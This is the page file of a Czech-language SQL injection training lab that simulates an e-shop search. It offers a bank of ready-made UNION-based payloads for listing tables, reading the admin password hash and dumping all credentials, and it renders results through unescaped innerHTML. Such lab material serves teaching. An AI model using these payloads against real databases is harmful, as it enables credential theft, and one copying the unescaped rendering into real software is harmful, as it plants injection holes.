<?php
session_start();

include "../include/applySettings.php";

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    <link href="/node_modules/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/styles/main.css">
    <title>SQL Injections Lab | 1</title>
</head>

<body>
    <a href="/index.php" class="m-2 btn btn-secondary">&larr; Zpět</a>

    <!-- Search bar and list of results -->
    <main class="container text-center">
        <form action="" method="post" id="search" class="input-group mt-5">
            <input type="search" class="form-control" placeholder="Vyhledávejte produkty v databázi" id="searchField" required>
            <button class="btn btn-outline-primary" type="submit" id="searchButton">Hledat</button>
        </form>
        <div id="results" class="mb-5"></div>

        <h6 class="m-0" id="query" style="visibility: <?= $showQueries ? 'visible' : 'hidden' ?>;"></h6>
    </main>

    <!-- List of predefined SQLi attacks -->
    <?php if($showAttackBank): ?>
    <div class="p-2 position-absolute bottom-0 start-0 ms-2 mb-2 acordion" style="width: 350px;" id="examples">
        <div class="accordion-item">
            <h2 class="accordion-header" id="example1">
                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
                    Zobrazit všechny produkty v databázi
                </button>
            </h2>
            <div class="container">
                <div id="collapseOne" class="accordion-collapse collapse hide row" aria-labelledby="example1" data-bs-parent="#examples">
                    <div class="accordion-body col">'--</div>
                    <button class="btn btn-light col-2" onclick="fillInCode('\'--')">
                        <i class="bi bi-chevron-right"></i>
                    </button>
                </div>
            </div>
        </div>
        <div class="accordion-item">
            <h2 class="accordion-header" id="example2">
                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
                    Zobrazit všechny tabulky databáze
                </button>
            </h2>
            <div class="container">
                <div id="collapseTwo" class="accordion-collapse collapse hide row" aria-labelledby="example2" data-bs-parent="#examples">
                    <div class="accordion-body col">' AND 1=0 UNION ALL SELECT 1, 1, name FROM sqlite_schema WHERE type ='table' AND name NOT LIKE 'sqlite_%'--</div>
                    <button class="btn btn-light col-2" onclick="fillInCode('\' AND 1=0 UNION ALL SELECT 1, 1, name FROM sqlite_schema WHERE type =\'table\' AND name NOT LIKE \'sqlite_%\'--')">
                        <i class="bi bi-chevron-right"></i>
                    </button>
                </div>
            </div>
        </div>
        <div class="accordion-item">
            <h2 class="accordion-header" id="example3">
                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
                    Získat hash hesla uživatele admin
                </button>
            </h2>
            <div class="container">
                <div id="collapseThree" class="accordion-collapse collapse hide row" aria-labelledby="example3" data-bs-parent="#examples">
                    <div class="accordion-body col">' AND 1=0 UNION SELECT 1, password, 1 FROM users WHERE username = 'admin'--</div>
                    <button class="btn btn-light col-2" onclick="fillInCode('\' AND 1=0 UNION SELECT 1, password, 1 FROM users WHERE username = \'admin\'--')">
                        <i class="bi bi-chevron-right"></i>
                    </button>
                </div>
            </div>
        </div>
        <div class="accordion-item">
            <h2 class="accordion-header" id="example4">
                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour">
                    Získat všechny přihlašovací údaje z databázové tabulky uživatelů
                </button>
            </h2>
            <div class="container">
                <div id="collapseFour" class="accordion-collapse collapse hide row" aria-labelledby="example4" data-bs-parent="#examples">
                    <div class="accordion-body col">' AND 1=0 UNION SELECT ALL 1, username, password FROM users--</div>
                    <button class="btn btn-light col-2" onclick="fillInCode('\' AND 1=0 UNION SELECT ALL 1, username, password FROM users--')">
                        <i class="bi bi-chevron-right"></i>
                    </button>
                </div>
            </div>
        </div>
        <div class="accordion-item">
            <h2 class="accordion-header" id="example5">
                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFive" aria-expanded="false" aria-controls="collapseFive">
                    Zobrazit verzi databáze
                </button>
            </h2>
            <div class="container">
                <div id="collapseFive" class="accordion-collapse collapse hide row" aria-labelledby="example5" data-bs-parent="#examples">
                    <div class="accordion-body col">' AND 1=0 UNION SELECT 1, "version", sqlite_version()--</div>
                    <button class="btn btn-light col-2" onclick="fillInCode('\' AND 1=0 UNION SELECT 1, \'version\', sqlite_version()--')">
                        <i class="bi bi-chevron-right"></i>
                    </button>
                </div>
            </div>
        </div>
    </div>
    <?php endif ?>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-U1DAWAznBHeqEIlVSCgzq+c9gqGAJn5c/t99JyeKa9xxaYpSvHU5awsuZVVFIhvj" crossorigin="anonymous"></script>

    <script>
        // Create list of results (or error message) and render them in DOM
        function renderResults(response, error = false) {
            let results = response.results;
            if (response.query !== undefined) {
                document.getElementById('query').innerHTML = `Query: <code id='query'>${response.query}</code>`;
            }

            if (error) {
                html = `<p>Vyskytla se chyba...\n\nError: ${response.status}\n${response.statusText}</p>`
            } else if (results.length === 0) {
                html = '<p>Nenalezli jsme žádné produkty odpovídající vyhledávání...</p>'
            } else {
                let rows = results.map(item => {
                    return `<li>
                        <div>
                            <div class="left">
                                <h4>${item.title}</h4>
                            </div>
                            <div class="right">
                                <h5>${item.price}&nbsp;Kč</h5>
                            </div>
                        </div>
                    </li>`;
                });

                html = `<ul>${rows.join("")}</ul>`;
            }

            document.getElementById('results').innerHTML = html;
        }

        // Make a POST request to search the database and capture the response
        $(document).ready(function() {
            $("#search").submit(function(event) {
                event.preventDefault();

                $.ajax({
                    url: "/level_helpers/e-shop.php",
                    type: "POST",
                    data: {
                        search: $("#searchField").val()
                    },
                    success: function(response) {
                        renderResults(response);
                    },
                    error: function(response) {
                        renderResults(response, true);
                    }
                });

            });
        });

        // Fill in code from attack list
        function fillInCode(code) {
            search = document.getElementById("searchField");
            search.value = code;
        }
    </script>
</body>

</html>
